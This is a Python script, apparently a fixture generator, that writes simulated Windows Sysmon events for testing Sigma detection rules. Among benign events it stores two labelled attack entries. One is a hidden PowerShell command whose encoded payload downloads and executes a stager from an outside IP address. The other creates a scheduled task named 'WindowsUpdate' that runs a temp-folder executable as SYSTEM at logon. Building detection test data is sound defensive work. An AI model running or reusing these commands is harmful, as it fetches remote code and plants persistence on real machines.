"""Generate simulated Windows event logs for Sigma rule testing."""

import json
import os

logs = [
    # Normal process creation events
    {
        "EventID": 1,
        "Source": "Sysmon",
        "TimeCreated": "2024-03-15T08:00:12Z",
        "Computer": "WORKSTATION01",
        "Image": "C:\\Windows\\System32\\svchost.exe",
        "ParentImage": "C:\\Windows\\System32\\services.exe",
        "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
        "User": "NT AUTHORITY\\SYSTEM",
        "LogonId": "0x3e7",
        "IntegrityLevel": "System",
    },
    {
        "EventID": 1,
        "Source": "Sysmon",
        "TimeCreated": "2024-03-15T08:01:30Z",
        "Computer": "WORKSTATION01",
        "Image": "C:\\Windows\\explorer.exe",
        "ParentImage": "C:\\Windows\\System32\\userinit.exe",
        "CommandLine": "C:\\Windows\\explorer.exe",
        "User": "CORP\\jsmith",
        "LogonId": "0x4a2f1",
        "IntegrityLevel": "Medium",
    },
    {
        "EventID": 1,
        "Source": "Sysmon",
        "TimeCreated": "2024-03-15T09:15:00Z",
        "Computer": "WORKSTATION01",
        "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "ParentImage": "C:\\Windows\\explorer.exe",
        "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
        "User": "CORP\\jsmith",
        "LogonId": "0x4a2f1",
        "IntegrityLevel": "Medium",
    },
    # ATTACK 1: PowerShell encoded command (T1059.001)
    {
        "EventID": 1,
        "Source": "Sysmon",
        "TimeCreated": "2024-03-15T14:22:33Z",
        "Computer": "WORKSTATION01",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ParentImage": "C:\\Windows\\System32\\REDACTED",
        "CommandLine": "powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADQAMQAuADIANwAuADMALwBzAHQAYQBnAGUAcgAnACkA",
        "User": "CORP\\jsmith",
        "LogonId": "0x4a2f1",
        "IntegrityLevel": "High",
    },
    # ATTACK 2: Scheduled task persistence (T1053.005)
    {
        "EventID": 1,
        "Source": "Sysmon",
        "TimeCreated": "2024-03-15T14:23:01Z",
        "Computer": "WORKSTATION01",
        "Image": "C:\\Windows\\System32\\schtasks.exe",
        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.exe\" /sc onlogon /ru SYSTEM",
        "User": "CORP\\jsmith",
        "LogonId": "0x4a2f1",
        "IntegrityLevel": "High",
    },
    # Normal scheduled task
    {
        "EventID": 1,
        "Source": "Sysmon",
        "TimeCreated": "2024-03-15T15:00:00Z",
        "Computer": "WORKSTATION01",
        "Image": "C:\\Windows\\System32\\schtasks.exe",
        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
        "CommandLine": "schtasks /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\"",
        "User": "NT AUTHORITY\\SYSTEM",
        "LogonId": "0x3e7",
        "IntegrityLevel": "System",
    },
    # Normal PowerShell
    {
        "EventID": 1,
        "Source": "Sysmon",
        "TimeCreated": "2024-03-15T10:30:00Z",
        "Computer": "WORKSTATION01",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ParentImage": "C:\\Windows\\explorer.exe",
        "CommandLine": "powershell.exe Get-Process",
        "User": "CORP\\jsmith",
        "LogonId": "0x4a2f1",
        "IntegrityLevel": "Medium",
    },
    # More noise
    {
        "EventID": 3,
        "Source": "Sysmon",
        "TimeCreated": "2024-03-15T09:16:00Z",
        "Computer": "WORKSTATION01",
        "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "DestinationIp": "142.250.80.46",
        "DestinationPort": 443,
        "Protocol": "tcp",
        "User": "CORP\\jsmith",
    },
    {
        "EventID": 3,
        "Source": "Sysmon",
        "TimeCreated": "2024-03-15T14:22:35Z",
        "Computer": "WORKSTATION01",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "DestinationIp": "185.141.27.3",
        "DestinationPort": 80,
        "Protocol": "tcp",
        "User": "CORP\\jsmith",
    },
]

os.makedirs("/data", exist_ok=True)
with open("/data/logs.json", "w") as f:
    json.dump(logs, f, indent=2)

print(f"Generated {len(logs)} log events at /data/logs.json")
